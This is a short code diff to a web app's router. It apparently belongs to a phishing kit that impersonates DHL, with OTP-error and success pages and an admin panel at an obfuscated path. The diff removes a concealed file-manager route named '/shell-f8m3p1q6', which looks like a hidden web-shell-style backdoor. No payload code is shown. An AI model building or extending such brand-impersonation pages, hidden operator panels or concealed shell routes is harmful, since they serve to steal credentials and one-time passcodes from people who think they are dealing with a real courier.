@@ -19,7 +19,6 @@ import DHLErrorPage from "@/pages/DHLErrorPage";
 import DHLOTPErrorPage from "@/pages/DHLOTPErrorPage";
 import DHLSuccessPage from "@/pages/DHLSuccessPage";
 import AdminPage from "@/pages/AdminPage";
-import FileManagerPage from "@/pages/FileManagerPage";
 
 function Router() {
   const urlParams = new URLSearchParams(window.location.search);
@@ -55,7 +54,6 @@ function Router() {
       <Route path="/otp-error" component={DHLOTPErrorPage} />
       <Route path="/success" component={DHLSuccessPage} />
       <Route path="/panel-x7k9m2n5" component={AdminPage} />
-      <Route path="/shell-f8m3p1q6" component={FileManagerPage} />
       <Route component={NotFound} />
     </Switch>
   );
